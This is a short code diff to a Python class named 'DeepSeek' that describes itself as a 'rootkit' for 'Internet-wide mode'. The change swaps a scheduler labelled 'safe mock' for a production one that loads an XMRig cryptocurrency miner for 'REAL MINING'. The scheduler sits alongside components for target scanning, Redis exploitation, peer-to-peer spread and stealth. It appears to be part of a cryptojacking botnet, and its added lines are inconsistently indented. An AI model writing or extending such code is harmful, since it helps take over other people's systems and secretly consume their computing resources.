@@ -10354,15 +10354,22 @@ class DeepSeek:
             except:
                 logger.warning("  ⚠️  Wallet pool skipped")
 
-            # CORE SCHEDULER (safe mock)
-            self.scheduler = AutonomousScheduler(
-                config_manager,
-                target_scanner=None,
-                redis_exploiter=None,
-                xmrig_manager=None,
-                p2p_manager=None,
-                stealth_manager=None
-            )
+# ========================================
+        # REAL MINING - SuperiorXMRigManager
+        # ========================================
+        self.xmrigmanager = SuperiorXMRigManager(self.config_manager)
+        logger.info("  ✅ SuperiorXMRigManager LOADED - 100% REAL MINING")
+
+        # CORE SCHEDULER (Production)
+        self.scheduler = AutonomousScheduler(
+            self.config_manager,
+            target_scanner=None,
+            redis_exploiter=None,
+            xmrig_manager=self.xmrigmanager,  # ✅ NOW EXISTS
+            p2p_manager=None,
+            stealth_manager=None
+        )
+
             logger.info("  ✅ Autonomous scheduler initialized")
             logger.info("🎯 DeepSeek rootkit READY - Internet-wide mode")
 
